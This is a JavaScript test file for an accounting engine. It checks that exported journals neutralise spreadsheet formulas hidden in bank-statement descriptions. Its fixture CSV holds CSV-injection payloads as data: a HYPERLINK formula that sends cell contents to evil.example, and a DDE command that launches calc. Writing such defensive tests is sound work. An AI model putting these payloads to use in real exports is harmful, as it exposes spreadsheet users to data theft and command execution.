// A bank description is untrusted text. In an exported CSV it must not open as a spreadsheet formula.
import { test } from "node:test";
import assert from "node:assert/strict";
import { newBooks, importStatement, exportJournal, exportLines, confirm } from "./engine.mjs";
import { parseCsv } from "./bank.mjs";

const CSV = `Date,Description,Amount
2026-01-02,"=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")",-12.50
2026-01-03,+CMD|' /C calc'!A0,-3.00
2026-01-04,@SUM(1+1),-4.00
2026-01-05,-2+3 refund,25.00
2026-01-06,Plain coffee,-5.00
`;

test("exported text columns neutralise formula-looking descriptions; amounts stay numeric", () => {
  let b = importStatement(newBooks(), CSV, "1000").books;
  b = confirm(b, Object.fromEntries(b.transactions.map((t) => [t.id, t.cents < 0 ? "6100" : "4000"])));
  for (const fmt of ["csv", "qbo", "xero"]) {
    const rows = parseCsv(exportJournal(b, fmt)).slice(1).filter((r) => r.length > 1);
    assert.ok(rows.length >= 10, fmt);
    for (const r of rows) for (const c of r) assert.ok(!/^[=+@\t\r]/.test(c) && !/^-\D/.test(c), `${fmt}: ${c}`);
  }
  const lines = parseCsv(exportLines(b)).slice(1).filter((r) => r.length > 1);
  assert.equal(lines.length, 5);
  for (const r of lines) {
    assert.ok(!/^[=+@-]/.test(r[2]), r[2]);
    assert.ok(Number.isFinite(Number(r[3])), "amount column is left bare: " + r[3]);
  }
  assert.ok(lines.some((r) => r[2] === "'=HYPERLINK(\"http://evil.example/?x=\"&A1,\"Click\")"));
  assert.ok(lines.some((r) => r[2] === "Plain coffee"));
});
